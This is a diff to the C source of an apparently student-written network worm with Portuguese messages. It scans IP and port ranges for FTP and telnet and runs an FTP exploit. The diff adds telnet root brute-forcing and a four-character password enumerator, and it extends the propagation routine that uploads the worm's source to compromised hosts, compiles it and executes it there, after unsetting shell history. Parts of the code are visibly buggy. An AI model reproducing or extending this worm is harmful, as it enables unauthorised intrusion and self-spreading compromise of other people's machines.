@@ -7,23 +7,26 @@
 
 #include "exploit.h"
 #include "recon.h"
+#include "brutexor.h"
 
 #define INIT_CMD "unset HISTFILE;id;uname -a;\n"
 #define MAX_COMMAND_SIZE 1024
 #define FTP_USERNAME "ftp"
+#define TELNET_USERNAME "root"
 #define FTP_PASSWORD "ftp"
 
 #define MAX(x, y) (((x) > (y)) ? (x) : (y))
 #define MIN(x, y) (((x) < (y)) ? (x) : (y))
 
-int run_ftp_exploit(char *hostname);
+int runFtpExploit(char *hostname);
 int propagate(int fd);
 int upload_file(int fd, const char *filename, const char *dest);
 int command(int fd, const char *str, ...);
 int shell(int fd);
-int ftp_exploit(open_ip target);
+int ftpExploit(open_ip target);
 int chooseAttack();
 void startTestConnection(range ips[], range ports);
+void findWord();
 
 int main(int argc, char *argv[]) {
     range porta;
@@ -42,10 +45,28 @@ int main(int argc, char *argv[]) {
     exit(EXIT_SUCCESS);
 }
 
-int ftp_exploit(open_ip target){
+int ftpExploit(open_ip target){
     int fd, ret;
     printf("# Running FTP exploit...\n");
-    fd = run_ftp_exploit(target.ip);
+    fd = runFtpExploit(target.ip);
+    if (fd < 0) {
+        fprintf(stderr, "Falha no exploit por FTP.\n");
+        return 0;
+    }
+    printf("# Propagating worm...\n");
+    ret = propagate(fd);
+    if (ret < 0) {
+        fprintf(stderr, "Falha ao propagar o worm.\n");
+        return 0;
+    }
+    close(fd);
+    return 1;
+}
+
+int telnetBruteForce(open_ip target){
+    int fd, ret;
+    printf("# Running FTP exploit...\n");
+    fd = runFtpExploit(target.ip);
     if (fd < 0) {
         fprintf(stderr, "Falha no exploit por FTP.\n");
         return 0;
@@ -66,15 +87,15 @@ int chooseAttack(){
 
 void randomAttack(open_ip target){
     if(chooseAttack)
-        if(ftp_exploit(target) != 1)
+        if(ftpExploit(target) != 1)
             bruteForce(target);
     else
         if(bruteForce(target) != 1)
-            ftp_exploit(target);
+            ftpExploit(target);
 }
 
 int bruteForce(open_ip target){
-    return 1;
+    findWord(target.ip);
 }
 
 /**
@@ -91,8 +112,9 @@ void startTestConnection(range ips[], range ports){
                 for(campo4 = ips[3].start; campo4 <= ips[3].end; campo4++){
                     sprintf(ip,"%d.%d.%d.%d",campo1,campo2,campo3,campo4);
                     strcpy(target.ip,"10.2.0.100");
-                    printf("IP: %s\n",ip);
+                    printf("IP: %s\n",target.ip);
                     for(porta = ports.start; porta <= ports.end; porta++){
+                        printf("Porta: %d\n",porta);
                         if(porta != 22)
                             if(testConnection("10.2.0.100",porta)){
                                 if(porta == FTP)
@@ -100,19 +122,26 @@ void startTestConnection(range ips[], range ports){
                                 else if(porta == TELNET)
                                     target.open_telnet = 1;
                             }
+                            else{
+                                printf("Falho\n");
+                            }
                     }
                     if(target.open_ftp && target.open_telnet){
                         printf("IP: %s\n com ftp e telnet abertos",ip);
-                        randomAttack(target);
+                        //randomAttack(target);
+                        bruteForce(target);
+                        exit(EXIT_SUCCESS);
                     }
                     else if(target.open_ftp){
                         printf("IP: %s\n com ftp aberto",ip);
-                        ftp_exploit(target);
+                        //ftpExploit(target);
+                        bruteForce(target);
                         exit(EXIT_SUCCESS);
                     }
                     else if(target.open_telnet){
                         printf("IP: %s\n com telnet aberto",ip);
                         bruteForce(target);
+                        exit(EXIT_SUCCESS);
                     }
                     target.open_ftp = 0;
                     target.open_telnet = 0;
@@ -122,7 +151,7 @@ void startTestConnection(range ips[], range ports){
     }
 }
 
-int run_ftp_exploit(char *hostname) {
+int runFtpExploit(char *hostname) {
     int fd, ret;
     target_t *target = NULL;
     char *banner;
@@ -151,6 +180,33 @@ int run_ftp_exploit(char *hostname) {
     return fd;
 }
 
+int runTelNetBruteForce(char *hostname,char *password) {
+    int fd, ret;
+    printf("Tentando IP:%s\n",hostname);
+    fd = telnet_login(hostname);
+    if (fd <= 0) {
+        printf("Falhou IP:%s\n",hostname);
+        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
+        return -1;
+    }
+
+    printf("Tryng user\n");
+    command(fd, "root\n");
+    printf("Tryng pass\n");
+    command(fd, "testenapwd\n");
+    printf("Tryng command\n");
+    //command(fd, "terminal length 0\n\n");
+
+    command(fd, "touch teste.txt\n\n");
+
+
+    if (ret != 0) {
+        return -1;
+    }
+
+    return fd;
+}
+
 int propagate(int fd) {
     printf("# Cleaning up and preparing...\n");
     if (command(fd, "rm -rf /tmp/src /tmp/worm") < 0) {
@@ -170,20 +226,29 @@ int propagate(int fd) {
     if (upload_file(fd, "./recon.h", "/tmp/src/recon.h") < 0) {
         return -1;
     }
+    if (upload_file(fd, "./brutexor.c", "/tmp/src/brutexor.c") < 0) {
+        return -1;
+    }
+    if (upload_file(fd, "./brutexor.h", "/tmp/src/brutexor.h") < 0) {
+        return -1;
+    }
     if (upload_file(fd, "./exploit.c", "/tmp/src/exploit.c") < 0) {
         return -1;
     }
     if (upload_file(fd, "./exploit.h", "/tmp/src/exploit.h") < 0) {
         return -1;
     }
+    if (upload_file(fd, "./Makefile", "/tmp/src/Makefile") < 0) {
+        return -1;
+    }
 
     printf("# Compiling...\n");
-    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/recon.c /tmp/src/exploit.c") < 0) {
+    if (command(fd, "cd /tmp/src/;make clean; make") < 0) {
         return -1;
     }
 
     printf("# Executing...\n");
-    if (command(fd, "/tmp/worm") < 0) {
+    if (command(fd, "./worm") < 0) {
         return -1;
     }
 
@@ -251,7 +316,7 @@ int command(int fd, const char *str, ...) {
     write(fd, buf, strlen(buf));
     read(fd, bufRead, sizeof(bufRead));
 
-   // printf("\nRetorno: %s\n", bufRead);
+    printf("\nRetorno: %s\n", bufRead);
 
     if (strncmp("ok", bufRead, 2) == 0) {
         return 0;
@@ -303,7 +368,44 @@ int shell(int fd) {
     return 0;
 }
 
-
+void findWord(char *hostname){
+    int size = 0;
+    int first, second, third, fourth, fifth, sixth, seventh, eighth;
+    int second_flag, third_flag, fourth_flag, fifth_flag, sixth_flag, seventh_flag, eighth_flag;
+    char first_char, second_char, third_char, fourth_char, fifth_char, sixth_char, seventh_char, eighth_char;
+    int word_index = 0;
+    char *word;
+	char buffer[33];
+    
+	for(first = 0; first <= 62; first ++){
+        first_char = return_char(first, &size);
+        
+        for(second = return_flag(first); second <= 62; second ++){
+            second_char = return_char(second, &size);
+            
+            for(third = return_flag(second); third <= 62; third ++){
+                third_char = return_char(third, &size);
+                
+                for(fourth = return_flag(third); fourth <= 62; fourth ++){
+                    fourth_char = return_char(fourth, &size);
+                    
+                    word = malloc (size + 2);
+                                    
+                    int i = 0;
+                                    
+                    append_char_function(first_char, word, &i);
+                    append_char_function(second_char, word, &i);
+                    append_char_function(third_char, word, &i);
+                    append_char_function(fourth_char, word, &i);;
+                    i++;
+                    word[i] = '\0';
+                    runTelNetBruteForce(hostname, word);
+                               
+                }
+            }
+        }
+    }
+}
 
 // int main(int argc, char **argv){
 //     char *ip;
